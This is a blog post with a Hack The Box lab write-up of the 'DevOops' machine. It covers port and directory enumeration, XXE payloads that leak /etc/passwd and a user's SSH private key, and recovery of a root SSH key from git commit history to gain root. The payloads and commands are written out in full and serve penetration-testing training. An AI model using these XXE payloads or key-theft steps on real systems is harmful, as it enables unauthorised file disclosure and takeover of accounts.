---
layout: post
title:  "DevOops Writeup - Hack The Box"
date:   2025-05-13
desc: ""
keywords: "HTB,eWPT,OSWE,Linux,XXE,Github,Information Leakage,Medium"
categories: [HTB]
tags: [HTB,eWPT,OSWE,Linux,XXE,Github,Information Leakage,Medium]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops.jpg" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

**[Hack The Box](https://www.hackthebox.com){:target="_blank"}** **DevOops** box is next, classified as **Medium** by the hacking community, which has a very well known vulnerability but very fun to exploit. Also the **Privilege Escalation** part is not very complex but it does take some time if you don't know what you are looking for, but the **Enumeration** phase also depends a lot on the experience you have practicing with different labs or the natural instinct you have, I had to practice continuously because I don't have any natural talent in this demanding field. It is time to spawn the box and start the challenge.

<br /><br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

First I will send a trace with `ping` to the target machine, and check that they arrive correctly, then I can use the `whichSystem.py` script from **[hack4u](https://hack4u.io/){:target="_blank"}** to check that the Operating System of the machine is **Linux**. Also with `nmap` I leak the information of the exposed ports and services, and the most relevant thing for the moment is that on port **80** the **[Gunicorn server](https://gunicorn.org/){:target="_blank"}** is accessible. With `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I do not get much more information from the **HTTP** services, but I can get the **Codename** of the machine with all the information collected so far. `searchsploit` also does not return any possible vulnerability or exploit that would allow me to attack the server.

> **[Gunicorn](https://gunicorn.org/){:target="_blank"}** 'Green Unicorn' is a Python **WSGI HTTP Server** for **UNIX**. It's a pre-fork worker model. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resources, and fairly speedy.

```bash
ping -c 1 10.10.10.91
whichSystem.py 10.10.10.91
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.91 -oG allPorts
nmap -sCV -p22,5000 10.10.10.91 -oN targeted
nmap -sCV -p22,5000 10.10.10.91 -oN targeted -Pn
#    --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
#    google.es --> OpenSSH 7.2p2 4ubuntu2.4 launchpad    Xenial

whatweb http://10.10.10.91:5000
# gunicorn/19.7.1

searchsploit gunicorn
# :(
```

<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `wfuzz` I perform a directory enumeration on the web server and I find two hidden paths, and in one of them there is an **API** that allows me to upload files, most likely in **[XML](https://aws.amazon.com/what-is/xml/){:target="_blank"}** format, so first I will try to upload a test one. I have no problems with the upload and in the browser it informs me how the file is interpreted and also **the path where it is saved**, and when accessing it shows me the typical structure of an **.xml** file.

> **[Extensible Markup Language (XML)](https://aws.amazon.com/what-is/xml/){:target="_blank"}** lets you define and store data in a shareable manner. **XML** supports information exchange between computer systems such as websites, databases, and third-party applications. Predefined rules make it easy to transmit data as **XML** files over any network because the recipient can use those rules to read the data accurately and efficiently.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.91:5000/FUZZ
# feed, upload

# http://10.10.10.91:5000/upload
# XML elements: Author, Subject, Content

nvim example.xml
# http://10.10.10.91:5000/uploads/example.xml
# :)
```

> **example.xml**:

```xml
<element>
  <Author> oldb0y </Author>
  <Subject> you are been pwned </Subject>
  <Content> test </Content>
</element>
```

<br/>
<img src="{{ site.img_path }}/devoops_writeup/DevOops_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The next step is to check that the server is vulnerable to an **[XXE (XML external entity) attack](https://portswigger.net/web-security/xxe){:target="_blank"}**, for this I will first upload a file with the necessary structure to leak the **passwd** system file. As the answer is successful and I have the list of all the users of the system I am going to look for the **id_rsa** of each one of them (that have assigned as Shell a **bash**), and I find the one of **roosa's account**. So if I create a file with the content of the leak **id_rsa** and give it the corresponding permissions (**600**) to avoid problems when connecting by **SSH**, the key allows me to connect without problems.

```bash
nvim xxe.xml
```

> **xxe.xml**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<element>
  <Author> &xxe; </Author>
  <Subject> passwd file leak </Subject>
  <Content> first attempt </Content>
</element>
```

```bash
nvim xxe2.xml
```

> **xxe2.xml**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa"> ]>
<element>
  <Author> &xxe; </Author>
  <Subject> passwd file leak </Subject>
  <Content> first attempt </Content>
</element>
```

```bash
nvim id_rsa
cat id_rsa | head -n 5
chmod 600 id_rsa
ssh -i id_rsa roosa@10.10.10.91
```

<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I successfully engage the machine, I perform the first commands to enumerate the system and the most interesting thing is that the **Codename** is the one I had obtained in **Launchpad**, the Linux version and most importantly that the user with which I succeeded in accessing belongs to the **sudo** group, but that does not help me much to escalate privileges since <ins>I do not have the password</ins>. Also the system has **Polkit's** `pkexec` tool, which is probably vulnerable to **[PwnKit](https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures){:target="_blank"}**, but it is not the intended way so I am going to look for another way to escalate privileges. Port **631** is open locally, but I'm not going to investigate it for now. After a long time without finding anything, but before uploading a script to automate the enumeration phase I'm going to search for files that have the user **roosa** as owner, I find a **Git** project and another with a very interesting name, which are worth investigating.

```bash
whoami
hostname
hostname -I
uname -a
lsb_release -a
# xenial
id
# adm, sudo   (I don't have password)
groups
export TERM=xterm
find \-perm -4000 2>/dev/null
getcap / -r 2>/dev/null
netstat -nat
ps -fawx

# Try harder!
find \-user roosa 2>/dev/null | grep -vE 'sys|proc|.local|.cache|.config'
# ./home/roosa/work/blogfeed/.git
```

<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I access the logs of the **Git Version Control System**, I can investigate the related commits and there is one that comments on one related to a key. If I analyze this commit I find an **id_rsa** key but it is the same as the one that already exists in the **authcredentials.key** file. I continue analyzing the logs and I find a commit, but this time the **id_rsa** is different, maybe it corresponds to another user or to **root**.

> **[Git](https://git-scm.com/book/en/v2/Getting-Started-What-is-Git%3F){:target="_blank"}** is a **free** and **open-source**, **distributed version control system**. It's essentially a tool that allows developers to track changes to their code over time, enabling them to collaborate efficiently and manage different versions of their projects. Unlike centralized systems, **Git** allows each developer to have a full copy of the project history locally, making it easier to work offline and collaborate on projects.

```bash
cd ./home/roosa/work/blogfeed/.git
git log
# 33e87c312c08735a02fa9c796021a4a3023129ad
# reverted accidental commit with proper key

git show 33e87c312c08735a02fa9c796021a4a3023129ad
# id_rsa!

# git log -p ........

find . \-name authcredentials.key 2>/dev/null
cat ./deploy/resources/integration/authcredentials.key
# root's id_rsa ?

cd ./home/roosa/work/blogfeed/.git
git show d387abf63e05c9628a59195cec9311751bdb283f
# Real id_rsa?
```

<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I am going to create a file with the content I just found and give it the corresponding permissions (***600*** - ***rw- --- ---***) to access by **SSH**. If I try to do it as the user with maximum privileges (**root**) I succeed to connect and get a Shell and thus escalate privileges, I can now access the last flag and finish successfully engage the **DevOops** box.

```bash
nvim root_id_rsa
cat root_id_rsa | head -n 10
chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.10.10.91
# :)

export TERM=xterm
whoami
hostname
hostname -I
```

<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> It was a box that I had a lot of fun with, I know it seems very simple to many, but for me it often takes time to find the way to successfully engage this type of machine because in some of the phases you have to think outside the box and the complexity is not so much about exploitation. The **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform never disappoints, so kill the **DevOops** machine and I'm on to the next one.

<br /><br />
<img src="{{ site.img_path }}/devoops_writeup/DevOops_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
